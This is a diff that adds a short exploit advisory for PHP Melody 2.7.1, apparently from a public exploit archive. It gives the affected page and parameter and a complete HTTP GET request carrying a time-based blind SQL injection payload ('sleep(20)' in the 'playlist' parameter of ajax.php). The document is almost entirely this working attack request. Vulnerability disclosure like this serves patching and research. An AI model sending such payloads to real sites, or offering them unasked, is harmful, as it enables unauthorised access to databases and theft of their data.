@@ -1,0 +1,22 @@
+# Exploit Title: PHP Melody v2.7.1 - SQL Injection
+# Date: 30/12/2017
+# Exploit Author: Ahmad Mahfouz 
+# Contact: http://twitter.com/eln1x
+# Vendor Homepage: http://www.phpsugar.com/ Buy http://www.phpsugar.com/phpmelody_order.html
+# Version: 2.7.1
+# Tested on: Mac OS
+#
+# SQL Injection Type: time-based blind
+# Parameter: playlist
+# Page: ajax.php
+# URL: http://target.com/ajax.php?p=video&do=getplayer&vid=[VALID_VIDO_ID]&aid=1&player=detail&playlist=[SQLi]
+
+ 
+
+GET /ajax.php?p=video&do=getplayer&vid=randomid&aid=1&player=detail&playlist='+(select*from(select(sleep(20)))a)+' HTTP/1.1
+Host: localhost
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Connection: close
